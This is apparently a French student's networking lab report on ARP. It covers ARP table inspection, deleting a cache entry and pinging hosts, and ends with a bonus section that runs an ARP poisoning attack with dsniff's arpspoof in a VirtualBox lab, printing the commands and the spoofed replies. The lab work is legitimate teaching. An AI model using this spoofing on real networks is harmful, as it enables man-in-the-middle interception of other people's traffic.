# ARP basics

## ☀️ Avant de continuer...

```powershell
PS C:\Users\jawad> ipconfig /all

Carte réseau sans fil Wi-Fi :
  Adresse physique . . . . . . . . . . . : C0-35-32-1C-AF-A9
```

## ☀️ Affichez votre table ARP

```powershell
PS C:\Users\jawad> arp -a

Interface : 192.168.56.1 --- 0x3
  Adresse Internet      Adresse physique      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  224.0.2.60            01-00-5e-00-02-3c     statique
  230.0.0.1             01-00-5e-00-00-01     statique
  239.242.6.7           01-00-5e-72-06-07     statique
  239.255.132.178       01-00-5e-7f-84-b2     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique

Interface : 10.33.77.199 --- 0xb
  Adresse Internet      Adresse physique      Type
  10.33.65.63           44-af-28-c3-6a-9f     dynamique
  10.33.66.78           e4-b3-18-48-36-68     dynamique
  10.33.79.254          7c-5a-1c-d3-d8-76     dynamique
  10.33.79.255          ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.242.6.7           01-00-5e-72-06-07     statique
  239.255.132.178       01-00-5e-7f-84-b2     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique
```

## ☀️ Déterminez l'adresse MAC de la passerelle du réseau de l'école

```powershell
PS C:\Users\jawad> ipconfig

Carte réseau sans fil Wi-Fi :
  Passerelle par défaut. . . . . . . . . : 10.33.79.254

PS C:\Users\jawad> arp -a

Interface : 10.33.77.199 --- 0xb
  10.33.79.254     7c-5a-1c-d3-d8-76     dynamique
```

## ☀️ Supprimez la ligne qui concerne la passerelle

```powershell
PS C:\WINDOWS\system32> arp -d 10.33.79.254
```

## ☀️ Prouvez que vous avez supprimé la ligne dans la table ARP

```powershell
PS C:\WINDOWS\system32> arp -a

Interface : 192.168.56.1 --- 0x3
  Adresse Internet      Adresse physique      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  224.0.2.60            01-00-5e-00-02-3c     statique
  230.0.0.1             01-00-5e-00-00-01     statique
  239.242.6.7           01-00-5e-72-06-07     statique
  239.255.132.178       01-00-5e-7f-84-b2     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique

Interface : 10.33.77.199 --- 0xb
  Adresse Internet      Adresse physique      Type
  10.33.65.63           44-af-28-c3-6a-9f     dynamique
  10.33.66.78           e4-b3-18-48-36-68     dynamique
  10.33.79.255          ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.242.6.7           01-00-5e-72-06-07     statique
  239.255.132.178       01-00-5e-7f-84-b2     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique
```

# ARP dans un réseau local

## ☀️ Déterminer

```powershell
PS C:\WINDOWS\system32> ipconfig

Carte réseau sans fil Wi-Fi :
  Adresse physique . . . . . . . . . . . : C0-35-32-1C-AF-A9
  Adresse IPv4. . . . . . . . . . . . . .: 172.20.10.5
```

## ☀️ DIY

```powershell
Carte réseau sans fil Wi-Fi :

   Suffixe DNS propre à la connexion. . . :
   Description. . . . . . . . . . . . . . : Realtek RTL8852BE WiFi 6 802.11ax PCIe Adapter
   Adresse physique . . . . . . . . . . . : C0-35-32-1C-AF-A9
   DHCP activé. . . . . . . . . . . . . . : Non
   Configuration automatique activée. . . : Oui
   Adresse IPv6. . . . . . . . . . . . . .: 2a04:cec0:101b:f5ca:3e15:8d82:7779:7906(préféré)
   Adresse IPv6 temporaire . . . . . . . .: 2a04:cec0:101b:f5ca:4924:7e2d:c7dc:2cc9(préféré)
   Adresse IPv6 de liaison locale. . . . .: fe80::949:b672:5dcb:8bd7%11(préféré)
   Adresse IPv4. . . . . . . . . . . . . .: 172.20.10.123(préféré)
   Masque de sous-réseau. . . . . . . . . : 255.255.255.240
   Passerelle par défaut. . . . . . . . . : fe80::e8a7:30ff:fef0:f164%11
   IAID DHCPv6 . . . . . . . . . . . : 113259826
   DUID de client DHCPv6. . . . . . . . : 00-01-00-01-2D-E2-D0-D6-40-C2-BA-52-11-43
   Serveurs DNS. . .  . . . . . . . . . . : fe80::e8a7:30ff:fef0:f164%11
   NetBIOS sur Tcpip. . . . . . . . . . . : Activé
```

## ☀️ Pingz !

```powershell
PS C:\WINDOWS\system32> ping 172.20.10.14

Envoi d’une requête 'Ping'  172.20.10.14 avec 32 octets de données :
Réponse de 172.20.10.14 : octets=32 temps<1ms TTL=128
Réponse de 172.20.10.14 : octets=32 temps<1ms TTL=128
Réponse de 172.20.10.14 : octets=32 temps<1ms TTL=128
Réponse de 172.20.10.14 : octets=32 temps<1ms TTL=128

Statistiques Ping pour 172.20.10.14:
    Paquets : envoyés = 4, reçus = 4, perdus = 0 (perte 0%),
Durée approximative des boucles en millisecondes :
    Minimum = 0ms, Maximum = 0ms, Moyenne = 0ms
PS C:\WINDOWS\system32> ping 172.20.10.10

Envoi d’une requête 'Ping'  172.20.10.10 avec 32 octets de données :
Réponse de 172.20.10.10 : octets=32 temps=18 ms TTL=128
Réponse de 172.20.10.10 : octets=32 temps=14 ms TTL=128
Réponse de 172.20.10.10 : octets=32 temps=7 ms TTL=128
Réponse de 172.20.10.10 : octets=32 temps=19 ms TTL=128

Statistiques Ping pour 172.20.10.10:
    Paquets : envoyés = 4, reçus = 4, perdus = 0 (perte 0%),
Durée approximative des boucles en millisecondes :
    Minimum = 7ms, Maximum = 19ms, Moyenne = 14ms
PS C:\WINDOWS\system32> ping 172.20.10.2

Envoi d’une requête 'Ping'  172.20.10.2 avec 32 octets de données :
Réponse de 172.20.10.2 : octets=32 temps=827 ms TTL=128
Réponse de 172.20.10.2 : octets=32 temps=23 ms TTL=128
Réponse de 172.20.10.2 : octets=32 temps=21 ms TTL=128
Réponse de 172.20.10.2 : octets=32 temps=47 ms TTL=128

Statistiques Ping pour 172.20.10.2:
    Paquets : envoyés = 4, reçus = 4, perdus = 0 (perte 0%),
Durée approximative des boucles en millisecondes :
    Minimum = 21ms, Maximum = 827ms, Moyenne = 229ms
PS C:\WINDOWS\system32> ping google.com

Envoi d’une requête 'ping' sur google.com [2a00:1450:4007:810::200e] avec 32 octets de données :
Réponse de 2a00:1450:4007:810::200e : temps=24 ms
Réponse de 2a00:1450:4007:810::200e : temps=26 ms
Réponse de 2a00:1450:4007:810::200e : temps=22 ms
Réponse de 2a00:1450:4007:810::200e : temps=25 ms

Statistiques Ping pour 2a00:1450:4007:810::200e:
    Paquets : envoyés = 4, reçus = 4, perdus = 0 (perte 0%),
Durée approximative des boucles en millisecondes :
    Minimum = 22ms, Maximum = 26ms, Moyenne = 24ms
```

# 3. Bonus : ARP poisoning

Adresse MAC de la machine (0A-00-27-00-00-03) et son adresse IP (192.168.56.1) :

```powershell
Carte Ethernet Ethernet 2 :

   Suffixe DNS propre à la connexion. . . :
   Description. . . . . . . . . . . . . . : VirtualBox Host-Only Ethernet Adapter
   Adresse physique . . . . . . . . . . . : 0A-00-27-00-00-03
   DHCP activé. . . . . . . . . . . . . . : Non
   Configuration automatique activée. . . : Oui
   Adresse IPv6 de liaison locale. . . . .: fe80::2d55:5721:e80a:d617%3(préféré)
   Adresse IPv4. . . . . . . . . . . . . .: 192.168.56.1(préféré)
   Masque de sous-réseau. . . . . . . . . : 255.255.255.0
   Passerelle par défaut. . . . . . . . . :
   IAID DHCPv6 . . . . . . . . . . . : 688521255
   DUID de client DHCPv6. . . . . . . . : 00-01-00-01-2D-E2-D0-D6-40-C2-BA-52-11-43
   NetBIOS sur Tcpip. . . . . . . . . . . : Activé
```

Adresse MAC de la Virtual Machine (08:00:27:74:ed:73) :

```powershell
root@jawad-ubuntu:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:50:9f:52 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute enp0s3
       valid_lft 84994sec preferred_lft 84994sec
    inet6 fe80::a00:27ff:fe50:9f52/64 scope link 
       valid_lft forever preferred_lft forever
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:74:ed:73 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.101/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s8
       valid_lft 395sec preferred_lft 395sec
    inet6 fe80::a990:d9fa:4fcb:e53f/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

Configuration de l'ArpSpoofing :

```powershell
jawad@jawad-ubuntu:~$ sudo su -
[sudo] password for jawad: 
root@jawad-ubuntu:~# echo 1 > /proc/sys/net/ipv4/ip_forward
root@jawad-ubuntu:~# apt install dsniff
root@jawad-ubuntu:~# arpspoof -i enp0s8 192.168.56.1
8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
...
```

Resultat sur WireShark :

*voir capture des packages (arpspoofing.pcap)*